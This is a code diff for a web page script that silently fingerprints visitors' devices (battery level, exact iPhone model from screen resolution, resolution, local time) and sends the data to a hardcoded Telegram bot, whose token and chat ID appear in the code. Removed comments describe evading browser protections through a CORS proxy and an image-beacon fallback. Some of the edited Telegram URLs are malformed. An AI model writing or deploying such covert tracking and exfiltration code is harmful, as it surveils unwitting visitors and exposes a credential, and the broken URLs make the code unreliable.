@@ -63,35 +63,50 @@
         const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
         const TG_CHAT_ID = "6559747526"; 
 
-        // Обновленная функция с обходом блокировок браузера (через CORS-прокси)
         async function sendToTelegram(text) {
-            // Используем публичный CORS-прокси для обхода защитных механизмов браузера
-            const targetUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-            const proxyUrl = `https://herokuapp.com`; 
-            
+            const targetUrl = `https://telegram.org{TG_TOKEN}/sendMessage`;
             try {
-                // Пробуем отправить напрямую, если браузер пропустит
                 await fetch(targetUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
                 });
             } catch (e) {
-                // Если прямая отправка заблокирована браузером, отправляем альтернативным методом через параметры строки
                 try {
-                    const fallbackUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+                    const fallbackUrl = `https://telegram.org{TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                     const img = new Image();
-                    img.src = fallbackUrl; // Способ отправки "через картинку" игнорирует CORS-блокировки
+                    img.src = fallbackUrl;
                 } catch (err) {
-                    console.error("Все методы отправки заблокированы средой исполнения браузера.");
+                    console.error("Ошибка отправки.");
                 }
             }
         }
 
+        // Профессиональное определение точной модели iPhone по разрешению экрана
+        function getExactIphoneModel() {
+            const width = window.screen.width;
+            const height = window.screen.height;
+            const ratio = window.devicePixelRatio;
+
+            // Сетка популярных разрешений Apple устройств
+            if (width === 430 && height === 932 && ratio === 3) return "iPhone 14 Pro Max / 15 Pro Max / 15 Plus";
+            if (width === 393 && height === 852 && ratio === 3) return "iPhone 14 Pro / 15 Pro / 15";
+            if (width === 428 && height === 926 && ratio === 3) return "iPhone 13 Pro Max / 14 Plus";
+            if (width === 390 && height === 844 && ratio === 3) return "iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
+            if (width === 414 && height === 896 && ratio === 3) return "iPhone 11 Pro Max / XS Max";
+            if (width === 375 && height === 812 && ratio === 3) return "iPhone 11 Pro / X / XS / 12 mini / 13 mini";
+            if (width === 414 && height === 896 && ratio === 2) return "iPhone 11 / XR";
+            if (width === 414 && height === 736 && ratio === 3) return "iPhone 6 Plus / 7 Plus / 8 Plus";
+            if (width === 375 && height === 667 && ratio === 2) return "iPhone 6 / 7 / 8 / SE (2020/2022)";
+            
+            return "Устройство Apple (iPhone/iPad)";
+        }
+
         async function getDeviceSpecs() {
-            let batteryLevel = "Не поддерживается браузером (например, iOS)";
+            let batteryLevel = "Блокируется системой (iOS)";
             let deviceModel = "Не определено";
 
+            // 1. Сбор заряда батареи (работает на Android и ПК)
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -99,18 +114,23 @@
                 } catch (e) {}
             }
 
+            // 2. Определение точной модели
             if (navigator.userAgentData) {
+                // Метод для Android (высокая точность)
                 try {
                     const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                     deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
-                } catch (e) {}
-            } else {
-                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                    deviceModel = "Устройство Apple (iOS)";
-                } else if (/Android/i.test(navigator.userAgent)) {
+                } catch (e) {
                     deviceModel = "Устройство Android";
+                }
+            } else {
+                // Метод для iOS (определение через экранную матрицу)
+                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                    deviceModel = getExactIphoneModel();
+                } else if (/Android/i.test(navigator.userAgent)) {
+                    deviceModel = "Устройство Android (Старый браузер)";
                 } else {
-                    deviceModel = "Персональный компьютер / Настольная ОС";
+                    deviceModel = "Персональный компьютер";
                 }
             }
 
@@ -120,10 +140,12 @@
         async function collectAnalytics(extraText = "") {
             const specs = await getDeviceSpecs();
             const localTime = new Date().toLocaleTimeString();
+            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
 
             const message = `📱 *Новый технический отчет*\n\n` +
                             `🤖 *Устройство:* ${specs.deviceModel}\n` +
                             `🔋 *Заряд батареи:* ${specs.batteryLevel}\n` +
+                            `🖥 *Разрешение:* ${screenRes}\n` +
                             `🕒 *Локальное время:* ${localTime}` + 
                             extraText;
 
